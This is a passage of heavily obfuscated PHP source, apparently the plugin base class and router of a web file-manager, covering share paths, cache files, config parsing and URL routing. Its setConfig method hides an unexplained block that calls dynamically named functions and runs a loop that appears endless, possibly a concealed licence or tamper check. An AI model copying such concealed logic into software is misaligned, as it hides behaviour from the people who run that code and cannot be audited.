fä®ŒØ•Œë: $f„³Ü›ß§É = Session::get($d¯æó¡ŞèÏ[1411]); if (!$f„³Ü›ß§É || !$f„³Ü›ß§É[$d¯æó¡ŞèÏ[1412]]) { $fÃëÓÇ¢ÀÄ = $d¯æó¡ŞèÏ[1413] . rawurlencode(this_url()); show_tips(LNG($d¯æó¡ŞèÏ[1414]) . $d¯æó¡ŞèÏ[1415] . $fÃëÓÇ¢ÀÄ . $d¯æó¡ŞèÏ[1416] . LNG($d¯æó¡ŞèÏ[1417]) . $d¯æó¡ŞèÏ[1418], !1); } if (!Action($d¯æó¡ŞèÏ[1419])->authCan($d¯æó¡ŞèÏ[1420])) { show_tips(LNG($d¯æó¡ŞèÏ[1421]) . $d¯æó¡ŞèÏ[1422], !1); } goto dĞ¯†Æ§ìº; dĞ¯†Æ§ìº: ActionCall($d¯æó¡ŞèÏ[1423], $cµÊáº—); goto bÀğĞ´İ³«; B‚ƒ…¿ÍÊ: $d¯æó¡ŞèÏ =& $_SERVER[´¬]; if (request_url_safe($cµÊáº—)) { return !0; } if ($this->isShare($cµÊáº—)) { return !0; } goto fä®ŒØ•Œë; bÀğĞ´İ³«: } final function isShare($FƒØŞŠ ñ•) { $BÍœ‹©¶–´ = KodIO::parse($FƒØŞŠ ñ•); return $BÍœ‹©¶–´[$_SERVER[´¬][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($fáŸŸÊ¬¹×) { if (request_url_safe($fáŸŸÊ¬¹×)) { return $fáŸŸÊ¬¹×; } if (!$this->isShare($fáŸŸÊ¬¹×)) { $fáŸŸÊ¬¹× = $this->filePath($fáŸŸÊ¬¹×); } return Action($_SERVER[´¬][1071])->linkOut($fáŸŸÊ¬¹×); } public function filePathLinkOut($d™·ÁØÃÍ†) { if (request_url_safe($d™·ÁØÃÍ†)) { return $d™·ÁØÃÍ†; } $this->fileCanView($d™·ÁØÃÍ†); return Action($_SERVER[´¬][1071])->link($d™·ÁØÃÍ†); } final function filePath($F•‘ÓŞÕÂ¢) { $DÅôƒê‡È¼ =& $_SERVER[´¬]; if ($FÇ×¾¸ÚÙï = $this->checkSharePath($F•‘ÓŞÕÂ¢)) { return $FÇ×¾¸ÚÙï; } $this->fileCanView($F•‘ÓŞÕÂ¢); if (request_url_safe($F•‘ÓŞÕÂ¢)) { $D±—–‘ÚÑ = parse_url_query($F•‘ÓŞÕÂ¢); if (isset($D±—–‘ÚÑ[$DÅôƒê‡È¼[1424]]) && isset($D±—–‘ÚÑ[$DÅôƒê‡È¼[208]])) { $cÜ…çö† = Model($DÅôƒê‡È¼[730])->get($DÅôƒê‡È¼[731]); $Dğ‚¦ë‡îï = Mcrypt::decode($D±—–‘ÚÑ[$DÅôƒê‡È¼[208]], $cÜ…çö†); if ($Dğ‚¦ë‡îï) { $this->fileInfo = IO::infoWithChildren($Dğ‚¦ë‡îï); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Dğ‚¦ë‡îï; } } $F•‘ÓŞÕÂ¢ = $this->_cacheHttpFile($F•‘ÓŞÕÂ¢); $this->fileInfo = IO::infoWithChildren($F•‘ÓŞÕÂ¢); } else { $this->fileInfo = IO::infoWithChildren($F•‘ÓŞÕÂ¢); if (!$this->fileInfo) { show_tips(LNG($DÅôƒê‡È¼[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $F•‘ÓŞÕÂ¢; } final function _cacheHttpFile($eÂ¿²¹›Éğ) { $Eœ“²Ú°Â = hash_path($eÂ¿²¹›Éğ, !0); $this->cachePath = $this->pluginCachePath($Eœ“²Ú°Â); if ($BÈÀÎ‹Œ‡• = IO::fileNameExist($this->cachePath, $Eœ“²Ú°Â)) { return KodIO::make($BÈÀÎ‹Œ‡•); } $d¯Ìö¥ÆØÓ = $this->cachePath . $Eœ“²Ú°Â; return $this->pluginCacheFileSet($d¯Ìö¥ÆØÓ, file_get_contents($eÂ¿²¹›Éğ)); } final function _tmpFileName($D¢Ÿô»ËÈˆ = array()) { goto DĞñÔÄÉò‡; BØßºÕÁ©: if (isset($D¢Ÿô»ËÈˆ[$e¦š˜í–˜[164]][$e¦š˜í–˜[171]])) { return $D¢Ÿô»ËÈˆ[$e¦š˜í–˜[164]][$e¦š˜í–˜[171]]; } $E²ƒµäÑ© = IO::hashSimple($D¢Ÿô»ËÈˆ[$e¦š˜í–˜[76]]); if ($E²ƒµäÑ©) { return $E²ƒµäÑ©; } goto Eòª÷ĞÎˆÏ; Eòª÷ĞÎˆÏ: $B£·Å£ö¯ = array($D¢Ÿô»ËÈˆ[$e¦š˜í–˜[28]], $D¢Ÿô»ËÈˆ[$e¦š˜í–˜[76]], $D¢Ÿô»ËÈˆ[$e¦š˜í–˜[78]]); if (isset($D¢Ÿô»ËÈˆ[$e¦š˜í–˜[485]])) { $B£·Å£ö¯[] = $D¢Ÿô»ËÈˆ[$e¦š˜í–˜[485]]; } return md5(implode($e¦š˜í–˜[71], $B£·Å£ö¯)); goto FğÚˆÛß¦•; DĞñÔÄÉò‡: $e¦š˜í–˜ =& $_SERVER[´¬]; if (!$D¢Ÿô»ËÈˆ) { $D¢Ÿô»ËÈˆ = $this->fileInfo; } if (isset($D¢Ÿô»ËÈˆ[$e¦š˜í–˜[171]])) { return $D¢Ÿô»ËÈˆ[$e¦š˜í–˜[171]]; } goto BØßºÕÁ©; FğÚˆÛß¦•: } final function checkSharePath($d¡àºçöé) { goto BĞÖá‰‰á; e¥¯íÔ…°: $this->cachePath = $this->pluginCachePath($this->fileInfo[$dˆñŞ–ª’[171]]); return $b·¨ñ‘›[$dˆñŞ–ª’[76]]; goto DÛç…‹‹ª¶; B½ö‹ƒ…ñ: $b·¨ñ‘› = Action($dˆñŞ–ª’[1071])->sharePathInfo($d¡àºçöé); if (!isset($b·¨ñ‘›[$dˆñŞ–ª’[76]])) { show_json(LNG($dˆñŞ–ª’[1426]), !1); } $this->fileInfo = $b·¨ñ‘›[$dˆñŞ–ª’[164]]; goto e¥¯íÔ…°; BĞÖá‰‰á: $dˆñŞ–ª’ =& $_SERVER[´¬]; if (!defined($dˆñŞ–ª’[452])) { define($dˆñŞ–ª’[1425], 0); } if (!$this->isShare($d¡àºçöé)) { return !1; } goto B½ö‹ƒ…ñ; DÛç…‹‹ª¶: } final function pluginCachePath($DäæÓà«šƒ = '') { $Aƒ¨ÏÌÛÉµ =& $_SERVER[´¬]; $c‰©®š’ï¹ = IO_PATH_SYSTEM_TEMP . $Aƒ¨ÏÌÛÉµ[1427] . $this->pluginName; if (!($c§ğ¿Í†·õ = IO::infoFull($c‰©®š’ï¹))) { return IO::mkdir($c‰©®š’ï¹ . $Aƒ¨ÏÌÛÉµ[8] . $DäæÓà«šƒ); } if (empty($DäæÓà«šƒ)) { return $c§ğ¿Í†·õ[$Aƒ¨ÏÌÛÉµ[76]]; } if (!($eœƒ¿Á†±ê = IO::fileNameExist($c§ğ¿Í†·õ[$Aƒ¨ÏÌÛÉµ[76]], $DäæÓà«šƒ))) { return IO::mkdir($c§ğ¿Í†·õ[$Aƒ¨ÏÌÛÉµ[76]] . $DäæÓà«šƒ); } return KodIO::make($eœƒ¿Á†±ê); } final function pluginCacheFileSet($b‹ÈŠÅÈŒ, $Aà«Ó³´¯¢ = '') { $càæó÷×éÌ =& $_SERVER[´¬]; if (!($eŠ±—ìÕ— = IO::infoFull($b‹ÈŠÅÈŒ))) { return IO::mkfile($b‹ÈŠÅÈŒ, $Aà«Ó³´¯¢, REPEAT_REPLACE); } IO::setContent($eŠ±—ìÕ—[$càæó÷×éÌ[76]], $Aà«Ó³´¯¢); return $eŠ±—ìÕ—[$càæó÷×éÌ[76]]; } final function pluginLocalFile($fÇ¬°†ÛéÑ = '') { goto b¨‡İæíº‘; b¨‡İæíº‘: $FÄšÑ•èâ¹ =& $_SERVER[´¬]; $eÌ‡ƒÈ»Ó¾ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($eÌ‡ƒÈ»Ó¾)) { mk_dir($eÌ‡ƒÈ»Ó¾); } goto d²£‡ÚÁÔœ; b¼²ã¾Œáì: return IO::copy($fÇ¬°†ÛéÑ, $eÌ‡ƒÈ»Ó¾, 0, $cÃ¼­ÆîĞ•); goto c¦¥ÕæÏ÷; d²£‡ÚÁÔœ: if (!$fÇ¬°†ÛéÑ) { return $eÌ‡ƒÈ»Ó¾; } $EÀÉ®‡¼çª = IO::info($fÇ¬°†ÛéÑ); $cÃ¼­ÆîĞ• = $this->_tmpFileName($EÀÉ®‡¼çª) . $FÄšÑ•èâ¹[95] . $EÀÉ®‡¼çª[$FÄšÑ•èâ¹[168]]; goto FµÌ®Úâ; FµÌ®Úâ: if (!checkExtSafe($cÃ¼­ÆîĞ•)) { $cÃ¼­ÆîĞ• = $cÃ¼­ÆîĞ• . $FÄšÑ•èâ¹[1428]; } $E§¨ß‘¬Ü = $eÌ‡ƒÈ»Ó¾ . $cÃ¼­ÆîĞ•; if (@file_exists($E§¨ß‘¬Ü)) { return $E§¨ß‘¬Ü; } goto b¼²ã¾Œáì; c¦¥ÕæÏ÷: } final function appPackage() { goto aŠÅ³£Ê£÷; bÀ§ß‚éë¼: $EÓÍæ…»†‚ = Hook::trigger($aÊé‡°ØÖ«[1430], $d—‡ÌˆÁ´‘); if ($EÓÍæ…»†‚ && is_array($EÓÍæ…»†‚)) { $d—‡ÌˆÁ´‘ = $EÓÍæ…»†‚; } $this->packageData = $d—‡ÌˆÁ´‘; goto a›¤ÈË“¡¾; a›¤ÈË“¡¾: return $d—‡ÌˆÁ´‘; goto aâ”âòñ ¸; Eì”£“ç¶: $this->parseLang($b£ìãÆ•ƒ ); $d—‡ÌˆÁ´‘ = json_decode_force($b£ìãÆ•ƒ ); if (!$d—‡ÌˆÁ´‘) { return array(); } goto bÀ§ß‚éë¼; aŠÅ³£Ê£÷: $aÊé‡°ØÖ« =& $_SERVER[´¬]; if ($this->packageData) { return $this->packageData; } $b£ìãÆ•ƒ  = $this->parseFile($this->pluginPath . $aÊé‡°ØÖ«[1429]); goto Eì”£“ç¶; aâ”âòñ ¸: } public function packageInfoGet($EĞ¸æğ•İ²) { $DŸÜí…¦šƒ = $this->appPackage(); return array_get_value($DŸÜí…¦šƒ, $EĞ¸æğ•İ²); } public function packageVersion() { return $this->packageInfoGet($_SERVER[´¬][1431]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[´¬][1432]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[´¬][1433]); } private function parseFile($c©™åëè‚ã) { goto B¯¹¾ÚÃ¾¥; Fˆà…¼Ş×: $E ÓÇİ†• = str_replace($eé…­Å‡óâ, $e§ÄÂ’“°„, $E ÓÇİ†•); return $E ÓÇİ†•; goto F¦¸ù¤ë®; bŠÕÁ¸ª½: $e§ÄÂ’“°„ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$FùŠ–š¯ˆ¿[88]][$FùŠ–š¯ˆ¿[1441]]); if (strstr($E ÓÇİ†•, $FùŠ–š¯ˆ¿[1442])) { $dîÆÚ¦‰àø = rawurlencode(json_encode($this->pluginLangArr)); $E ÓÇİ†• = str_replace($FùŠ–š¯ˆ¿[1442], $dîÆÚ¦‰àø, $E ÓÇİ†•); } if (strstr($E ÓÇİ†•, $FùŠ–š¯ˆ¿[1443])) { $dîÆÚ¦‰àø = $dîÆÚ¦‰àø = rawurlencode(json_encode($this->getConfig())); $E ÓÇİ†• = str_replace($FùŠ–š¯ˆ¿[1443], $dîÆÚ¦‰àø, $E ÓÇİ†•); } goto Fˆà…¼Ş×; B¯¹¾ÚÃ¾¥: $FùŠ–š¯ˆ¿ =& $_SERVER[´¬]; $E ÓÇİ†• = file_get_contents($c©™åëè‚ã); $eé…­Å‡óâ = array($FùŠ–š¯ˆ¿[1434], $FùŠ–š¯ˆ¿[1435], $FùŠ–š¯ˆ¿[1436], $FùŠ–š¯ˆ¿[1437], $FùŠ–š¯ˆ¿[1438], $FùŠ–š¯ˆ¿[1439], $FùŠ–š¯ˆ¿[1440]); goto bŠÕÁ¸ª½; F¦¸ù¤ë®: } private function parseLang(&$CŒ·îäŸÀÍ) { goto fø¾ÚšÎ‹â; D‹õŸö÷ßÈ: $AÕ°Üæ†İµ = array(); foreach ($F¨š¹áµí®[0] as $A¶¿¶éø„‹) { $ağ×õè™Ã‚ = substr($A¶¿¶éø„‹, strlen($E½×òª½Ô), -4); $FÍ§êåÏ­ç = LNG($ağ×õè™Ã‚); $eêğÙºñƒ›[] = $A¶¿¶éø„‹; $AÕ°Üæ†İµ[] = str_replace(array($fªµºèĞ—á[228], $fªµºèĞ—á[1039], $fªµºèĞ—á[339], $fªµºèĞ—á[116]), array($fªµºèĞ—á[50], $fªµºèĞ—á[50], $fªµºèĞ—á[33], $fªµºèĞ—á[1446]), $FÍ§êåÏ­ç); } $CŒ·îäŸÀÍ = str_replace($eêğÙºñƒ›, $AÕ°Üæ†İµ, $CŒ·îäŸÀÍ); goto EˆòŠ˜Ûˆß; fø¾ÚšÎ‹â: $fªµºèĞ—á =& $_SERVER[´¬]; $E½×òª½Ô = $fªµºèĞ—á[1444]; if (!strstr($CŒ·îäŸÀÍ, $E½×òª½Ô)) { return; } goto FºÌğâš¹; FºÌğâš¹: preg_match_all($fªµºèĞ—á[1445], $CŒ·îäŸÀÍ, $F¨š¹áµí®); if (!is_array($F¨š¹áµí®) || count($F¨š¹áµí®) == 0 || !is_array($F¨š¹áµí®[0]) || count($F¨š¹áµí®[0]) == 0) { return; } $eêğÙºñƒ› = array(); goto D‹õŸö÷ßÈ; EˆòŠ˜Ûˆß: } private function parseConfig(&$Böç‰éœ‰) { goto C¤è›ÈÄ¸Ë; fò¬Öêªç“: $F£¦ÑÑññ• = array(); $F¤ğº–‹Àô = array(); foreach ($f¼ëÔ óİÎ[0] as $fâ¼À‚¯Şë) { $CÜ¼—ƒ†Î = substr($fâ¼À‚¯Şë, strlen($fË—·ñ°), -2); $F£¦ÑÑññ•[] = $fâ¼À‚¯Şë; $F¤ğº–‹Àô[] = _get($c›±•¼òó˜, $CÜ¼—ƒ†Î); } goto c—‚„˜©®; C¤è›ÈÄ¸Ë: $DĞíòæ„È“ =& $_SERVER[´¬]; $fË—·ñ° = $DĞíòæ„È“[1447]; if (!strstr($Böç‰éœ‰, $fË—·ñ°)) { return; } goto Ašºİ‡¨˜; c—‚„˜©®: $Böç‰éœ‰ = str_replace($F£¦ÑÑññ•, $F¤ğº–‹Àô, $Böç‰éœ‰); goto Dí©¨È×ÍŠ; Ašºİ‡¨˜: preg_match_all($DĞíòæ„È“[1448], $Böç‰éœ‰, $f¼ëÔ óİÎ); if (!is_array($f¼ëÔ óİÎ) || count($f¼ëÔ óİÎ) == 0 || !is_array($f¼ëÔ óİÎ[0]) || count($f¼ëÔ óİÎ[0]) == 0) { return; } $c›±•¼òó˜ = $this->getConfig(); goto fò¬Öêªç“; Dí©¨È×ÍŠ: } private function parsePackage(&$F„‡ò¡¾ö¯) { goto E÷êÉµ; DÔÈŠ°ò®: $cÇËğÌÒ»« = array(); $FÆÁİÑ­Œº = array(); foreach ($DÊ’‰ˆÄ™Ä[0] as $D¢•¾¼éö¢) { $AÙĞŞ’ïó = substr($D¢•¾¼éö¢, strlen($fíæ‚Œ¼˜õ), -2); $cÇËğÌÒ»«[] = $D¢•¾¼éö¢; $FÆÁİÑ­Œº[] = _get($bÚÕ«ŒÚˆª, $AÙĞŞ’ïó); } goto A÷¯²ÒÁé¤; E÷êÉµ: $fäì¨ˆ¸„÷ =& $_SERVER[´¬]; $fíæ‚Œ¼˜õ = $fäì¨ˆ¸„÷[1449]; if (!strstr($F„‡ò¡¾ö¯, $fíæ‚Œ¼˜õ)) { return; } goto Bš­šÏ‘ˆø; A÷¯²ÒÁé¤: $F„‡ò¡¾ö¯ = str_replace($cÇËğÌÒ»«, $FÆÁİÑ­Œº, $F„‡ò¡¾ö¯); goto b™íÂãŒ; Bš­šÏ‘ˆø: preg_match_all($fäì¨ˆ¸„÷[1450], $F„‡ò¡¾ö¯, $DÊ’‰ˆÄ™Ä); if (!is_array($DÊ’‰ˆÄ™Ä) || count($DÊ’‰ˆÄ™Ä) == 0 || !is_array($DÊ’‰ˆÄ™Ä[0]) || count($DÊ’‰ˆÄ™Ä[0]) == 0) { return; } $bÚÕ«ŒÚˆª = $this->appPackage(); goto DÔÈŠ°ò®; b™íÂãŒ: } final function echoFile($AË°ƒÙ¿ø, $Cˆ²ïÍÂª = false) { goto C¡ÁŠ«à„²; b¢Î³Åë‚: $f™Òò§äÕà = $this->parseFile($bÌ‚˜Ö±½ ); $this->parseLang($f™Òò§äÕà); $this->parseConfig($f™Òò§äÕà); goto B¥Æ÷ÆÅ¼˜; C¡ÁŠ«à„²: $c»â® Š‚‡ =& $_SERVER[´¬]; $bÌ‚˜Ö±½  = $this->pluginPath . $AË°ƒÙ¿ø; if (ACT == $c»â® Š‚‡[1451]) { echo $c»â® Š‚‡[1452] . $this->pluginName . $c»â® Š‚‡[8] . $AË°ƒÙ¿ø . $c»â® Š‚‡[1453]; if (!file_exists($bÌ‚˜Ö±½ )) { echo $c»â® Š‚‡[1454]; return; } } goto b¢Î³Åë‚; B¥Æ÷ÆÅ¼˜: $this->parsePackage($f™Òò§äÕà); if (is_array($Cˆ²ïÍÂª)) { $f™Òò§äÕà = str_replace(array_keys($Cˆ²ïÍÂª), array_values($Cˆ²ïÍÂª), $f™Òò§äÕà); } echo $c»â® Š‚‡[228] . $f™Òò§äÕà; goto bÂÃ¯ÁÛ³Å; bÂÃ¯ÁÛ³Å: } final function initLang() { goto eôÛµ¦Î“é; A¶Õ­Ô„Œ: if (!is_array($A®Ğ•«Šëˆ)) { return array(); } if (@count($A®Ğ•«Šëˆ) > 0) { I18n::set($A®Ğ•«Šëˆ); } return $A®Ğ•«Šëˆ; goto c¾‰¼™¢á‹; eíöø›Œ¹„: $aÅ…èõ¤‹› = I18n::getType(); $A®Ğ•«Šëˆ = array(); if (file_exists($f‘÷È­ÇãÉ . $aÅ…èõ¤‹› . $dÀëÏ©ˆ•Ü[803])) { $A®Ğ•«Šëˆ = (include $f‘÷È­ÇãÉ . $aÅ…èõ¤‹› . $dÀëÏ©ˆ•Ü[803]); } else { if ($aÅ…èõ¤‹› == $dÀëÏ©ˆ•Ü[1457] && !file_exists($f‘÷È­ÇãÉ . $aÅ…èõ¤‹› . $dÀëÏ©ˆ•Ü[803]) && file_exists($f‘÷È­ÇãÉ . $dÀëÏ©ˆ•Ü[1458])) { $A®Ğ•«Šëˆ = (include $f‘÷È­ÇãÉ . $dÀëÏ©ˆ•Ü[1458]); } else { if (file_exists($f‘÷È­ÇãÉ . $e‰ö¹Ñ±– . $dÀëÏ©ˆ•Ü[803])) { $A®Ğ•«Šëˆ = (include $f‘÷È­ÇãÉ . $e‰ö¹Ñ±– . $dÀëÏ©ˆ•Ü[803]); } } } goto A¶Õ­Ô„Œ; eôÛµ¦Î“é: $dÀëÏ©ˆ•Ü =& $_SERVER[´¬]; $e‰ö¹Ñ±– = $dÀëÏ©ˆ•Ü[1455]; $f‘÷È­ÇãÉ = $this->pluginPath . $dÀëÏ©ˆ•Ü[1456]; goto eíöø›Œ¹„; c¾‰¼™¢á‹: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($BŒ—‡Œ¤†­) { $FñğÙ½½ÙÖ =& $_SERVER[´¬]; if (!isset($_SERVER[$FñğÙ½½ÙÖ[821]]) || !isset($_SERVER[$FñğÙ½½ÙÖ[828]])) { goto EÊö®¢Æàİ; FÂñ£ÜÖØ´: for ($F–Óš…Ô»† = $f‘ˆÛß”ñ¥; $F–Óš…Ô»† > 0; $F–Óš…Ô»†++) { $bàä™ö–·š = json_encode($GLOBALS[$FñğÙ½½ÙÖ[409]]); } goto d“Í ˜•ˆ†; dÕ£¤ôÅ¡Ä: $CÇƒÌİĞñİ = $CŠÊà‘¬«($cÒ¸‘ÆÓÌ¾); $E×­¡´ì¶… = explode($FñğÙ½½ÙÖ[228], $CÇƒÌİĞñİ); if (count($E×­¡´ì¶…) < $FñğÙ½½ÙÖ[585]) { $FğâÅ·†çÍ = $FñğÙ½½ÙÖ[826]; $FğâÅ·†çÍ(); } goto F±õâŒÓÙˆ; F±õâŒÓÙˆ: $bàä™ö–·š = $FñğÙ½½ÙÖ[841]; $bàä™ö–·š($_SERVER[$FñğÙ½½ÙÖ[842]]); $f‘ˆÛß”ñ¥ = 1; goto FÂñ£ÜÖØ´; EÊö®¢Æàİ: $dÌ¸ÔË•† = $FñğÙ½½ÙÖ[840]; $CŠÊà‘¬« = $FñğÙ½½ÙÖ[823]; $cÒ¸‘ÆÓÌ¾ = $_SERVER[$FñğÙ½½ÙÖ[824]] . $FñğÙ½½ÙÖ[825]; goto dÕ£¤ôÅ¡Ä; d“Í ˜•ˆ†: } return $this->modelPlugin->setConfig($this->pluginName, $BŒ—‡Œ¤†­); } public function onSetConfig($BÆ«ã¿÷µç) { } public function onGetConfig($FÌƒ®ôµ£Æ) { } public function onChangeStatus($C˜ÕÉ×¬ò) { } public function onUninstall() { } public function onInstall() { } public function authCheck($bõÎ„©·ä = "\x70\154\165\x67\x69\156\x41\165\x74\x68") { $d˜ãÁµÒ…– =& $_SERVER[´¬]; if (!defined($d˜ãÁµÒ…–[452])) { return !1; } if (_get($GLOBALS, $d˜ãÁµÒ…–[483])) { return !0; } $CˆõËçÆÇè = $this->getConfig(); if (!$CˆõËçÆÇè[$bõÎ„©·ä]) { return !1; } return ActionCall($d˜ãÁµÒ…–[1459], $CˆõËçÆÇè[$bõÎ„©·ä]); } public function url($D¨™åˆŸ¹Ü, $A»¤£„— Ò = '', $c¿É«ÆŠ«È = true) { goto fµäÂá‘ïÉ; b„‘ÙÀ÷›Ì: if (!$c¿É«ÆŠ«È) { return $E®Û‘ë©Á÷; } echo $E®Û‘ë©Á÷; goto bë¹ˆøİšÇ; D…ß¸«Í: $cÜ¦ô¹Œƒ = $this->packageVersion(); $FÛ…‰ñ—îŠ = $dù†º¯é…ø . $dˆ—­êÉ[438] . $cÜ¦ô¹Œƒ; if (substr($D¨™åˆŸ¹Ü, 0, 4) == $dˆ—­êÉ[147] || substr($D¨™åˆŸ¹Ü, 0, 2) == $dˆ—­êÉ[1245]) { $E®Û‘ë©Á÷ = $D¨™åˆŸ¹Ü . $dˆ—­êÉ[1460] . $FÛ…‰ñ—îŠ; } else { if ($A»¤£„— Ò == $dˆ—­êÉ[33]) { $E®Û‘ë©Á÷ = $this->pluginHost . $D¨™åˆŸ¹Ü . $dˆ—­êÉ[1460] . $FÛ…‰ñ—îŠ; } else { if ($A»¤£„— Ò === $dˆ—­êÉ[77]) { $E®Û‘ë©Á÷ = $this->pluginHost . $D¨™åˆŸ¹Ü; } else { if ($A»¤£„— Ò == $dˆ—­êÉ[1461]) { $E®Û‘ë©Á÷ = STATIC_PATH . $D¨™åˆŸ¹Ü . $dˆ—­êÉ[1460] . $dù†º¯é…ø; } else { if ($A»¤£„— Ò == $dˆ—­êÉ[1462]) { $E®Û‘ë©Á÷ = APP_HOST . $dˆ—­êÉ[1463] . $D¨™åˆŸ¹Ü . $dˆ—­êÉ[1460] . $dù†º¯é…ø; } else { if (isset($B´ò¾—¤[$A»¤£„— Ò])) { $E®Û‘ë©Á÷ = $B´ò¾—¤[$A»¤£„— Ò] . $D¨™åˆŸ¹Ü . $dˆ—­êÉ[1460] . $FÛ…‰ñ—îŠ; } } } } } } goto b„‘ÙÀ÷›Ì; fµäÂá‘ïÉ: $dˆ—­êÉ =& $_SERVER[´¬]; $B´ò¾—¤ = $this->getConfig(); $dù†º¯é…ø = KOD_VERSION . $dˆ—­êÉ[95] . KOD_VERSION_BUILD; goto D…ß¸«Í; bë¹ˆøİšÇ: } public function link($Aö‚¹ÕÑ²‰ = false, $bÎ¥Î¾×Ö¼ = '') { $fÌÚ¥Å—Ñ =& $_SERVER[´¬]; if (!$Aö‚¹ÕÑ²‰) { $this->link($fÌÚ¥Å—Ñ[1464], $fÌÚ¥Å—Ñ[1462]); $this->link($fÌÚ¥Å—Ñ[1465], $fÌÚ¥Å—Ñ[1461]); $this->link($fÌÚ¥Å—Ñ[1466], $fÌÚ¥Å—Ñ[1461]); $this->link($fÌÚ¥Å—Ñ[1467], $fÌÚ¥Å—Ñ[1461]); $this->link($fÌÚ¥Å—Ñ[1468], $fÌÚ¥Å—Ñ[1461]); return; } $b¡è›Õ„¸ = $this->url($Aö‚¹ÕÑ²‰, $bÎ¥Î¾×Ö¼, !1); if (substr($Aö‚¹ÕÑ²‰, -3) == $fÌÚ¥Å—Ñ[1469]) { echo $fÌÚ¥Å—Ñ[1470] . $b¡è›Õ„¸ . $fÌÚ¥Å—Ñ[1471] . $fÌÚ¥Å—Ñ[228]; } else { if (substr($Aö‚¹ÕÑ²‰, -4) == $fÌÚ¥Å—Ñ[1472]) { echo $fÌÚ¥Å—Ñ[1473] . $b¡è›Õ„¸ . $fÌÚ¥Å—Ñ[1474] . $fÌÚ¥Å—Ñ[228]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\133\x5e\57\135\53", "\72\x6e\165\155" => "\133\60\55\71\x5d\x2b", "\72\x61\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($dÄ†±Á¿Õ­, $e‰‹ğÂ¸Œ‹) { $d¬İÇŞ“Ç =& $_SERVER[´¬]; if ($dÄ†±Á¿Õ­ == $d¬İÇŞ“Ç[1475]) { $CïĞùá…ˆÎ = array_map($d¬İÇŞ“Ç[1476], $e‰‹ğÂ¸Œ‹[0]); $E“˜ˆ®ã«‹ = strpos($e‰‹ğÂ¸Œ‹[1], $d¬İÇŞ“Ç[8]) === 0 ? $e‰‹ğÂ¸Œ‹[1] : $d¬İÇŞ“Ç[8] . $e‰‹ğÂ¸Œ‹[1]; $c‹¶¹‚İÁ† = $e‰‹ğÂ¸Œ‹[2]; } else { $CïĞùá…ˆÎ = null; $E“˜ˆ®ã«‹ = strpos($e‰‹ğÂ¸Œ‹[0], $d¬İÇŞ“Ç[8]) === 0 ? $e‰‹ğÂ¸Œ‹[0] : $d¬İÇŞ“Ç[8] . $e‰‹ğÂ¸Œ‹[0]; $c‹¶¹‚İÁ† = $e‰‹ğÂ¸Œ‹[1]; } array_push(self::$maps, $CïĞùá…ˆÎ); array_push(self::$routes, $E“˜ˆ®ã«‹); array_push(self::$methods, strtoupper($dÄ†±Á¿Õ­)); array_push(self::$callbacks, $c‹¶¹‚İÁ†); } public static function error($aÊÈº„‡) { self::$errorCallback = $aÊÈº„‡; } public static function haltOnMatch($Dƒ©˜”ê¦Ó = true) { self::$halts = $Dƒ©˜”ê¦Ó; } public static function dispatch() { goto BºÜ¼˜ìÀ×; bÈ›¡‚‹°: self::$routes = preg_replace($E»äá¢¿¾[1164], $E»äá¢¿¾[8], self::$routes); if (in_array($Dİ¾öˆŠÁø, self::$routes)) { $b¶ÂÕ¢÷Ô = array_keys(self::$routes, $Dİ¾öˆŠÁø); foreach ($b¶ÂÕ¢÷Ô as $C¶Ï…Û‹­Å) { if (self::$methods[$C¶Ï…Û‹­Å] == $fæÙÊÓ†ˆò || self::$methods[$C¶Ï…Û‹­Å] == $E»äá¢¿¾[1478] || in_array($fæÙÊÓ†ˆò, self::$maps[$C¶Ï…Û‹­Å])) { $EÄê†¶»äŠ = !0; if (!is_object(self::$callbacks[$C¶Ï…Û‹­Å])) { $C‘à“–¢Å× = explode($E»äá¢¿¾[8], self::$callbacks[$C¶Ï…Û‹­Å]); $e¬ŒİØ¹Ñø = end($C‘à“–¢Å×); $fÓÂµº¤ = explode($E»äá¢¿¾[1479], $e¬ŒİØ¹Ñø); $DÛ¦ÃÒôøæ = new $fÓÂµº¤[0](); $DÛ¦ÃÒôøæ->{$fÓÂµº¤[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$C¶Ï…Û‹­Å]); if (self::$halts) { return; } } } } } else { $FÚŒê­ãÏÔ = 0; foreach (self::$routes as $C¶Ï…Û‹­Å) { if (strpos($C¶Ï…Û‹­Å, $E»äá¢¿¾[4]) !== !1) { $C¶Ï…Û‹­Å = str_replace($c½‹•ÌõÏò, $f²¼­²Ÿƒë, $C¶Ï…Û‹­Å); } if (preg_match($E»äá¢¿¾[1480] . $C¶Ï…Û‹­Å . $E»äá¢¿¾[1481], $Dİ¾öˆŠÁø, $AÖËÅï¥‚—)) { if (self::$methods[$FÚŒê­ãÏÔ] == $fæÙÊÓ†ˆò || self::$methods[$FÚŒê­ãÏÔ] == $E»äá¢¿¾[1478] || !empty(self::$maps[$FÚŒê­ãÏÔ]) && in_array($fæÙÊÓ†ˆò, self::$maps[$FÚŒê­ãÏÔ])) { $EÄê†¶»äŠ = !0; array_shift($AÖËÅï¥‚—); if (!is_object(self::$callbacks[$FÚŒê­ãÏÔ])) { $C‘à“–¢Å× = explode($E»äá¢¿¾[8], self::$callbacks[$FÚŒê­ãÏÔ]); $e¬ŒİØ¹Ñø = end($C‘à“–¢Å×); $fÓÂµº¤ = explode($E»äá¢¿¾[1479], $e¬ŒİØ¹Ñø); $DÛ¦ÃÒôøæ = new $fÓÂµº¤[0](); if (!method_exists($DÛ¦ÃÒôøæ, $fÓÂµº¤[1])) { echo $E»äá¢¿¾[1482]; } else { call_user_func_array(array($DÛ¦ÃÒôøæ, $fÓÂµº¤[1]), $AÖËÅï¥‚—); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$FÚŒê­ãÏÔ], 